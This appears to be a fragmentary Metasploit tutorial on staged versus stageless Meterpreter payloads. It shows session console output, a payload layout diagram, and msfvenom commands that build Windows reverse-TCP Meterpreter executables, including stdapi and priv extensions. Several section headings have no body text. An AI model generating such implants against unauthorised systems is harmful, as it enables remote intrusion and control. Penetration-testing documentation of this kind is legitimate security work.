## What is a staged payload?
## Exploitation (recap) with staged Meterpreter
## What's wrong with staged Meterpreter?
It's hard to believe it possible, but in this case the following image could be considered a nightmare.
```msf
[*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx
[*] Meterpreter session 4684 opened ....
[*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx
[*] Meterpreter session 4685 opened ....
[*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx
[*] Meterpreter session 4686 opened ....
[*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx
[*] Meterpreter session 4687 opened ....
[*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx
[*] Meterpreter session 4688 opened ....
[*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx
[*] Meterpreter session 4689 opened ....
```

## What does stageless Meterpreter look like?
The final payload layout looks like the following:
```
+-+--------+-----------------------------------------------------------+
| |        |                    Configuration Block                    |
|b|        |+-----------+-+---------+-+---------+-------+-----------+-+|
|o|        ||  session  |S|         |S|         |       |           |N||
|o| metsrv ||    and    |i|  ext 1  |i|  ext 2  |  ...  | ext inits |U||
|t|        || transport |z|         |z|         |       |           |L||
| |        ||  config   |e|         |e|         |       |           |L||
| |        |+-----------+-+---------+-+---------+-------+-----------+-+|
+-+--------+-----------------------------------------------------------+
```

## How do I use stageless Meterpreter?
To make a stageless payload that contains only `metsrv` we do the following:
```
$ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 -f exe -o stageless.exe
```

To add extensions to the payload, we can make use of the `EXTENSIONS` parameter, which takes a comma-separated list of extension names.
```
$ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe
```

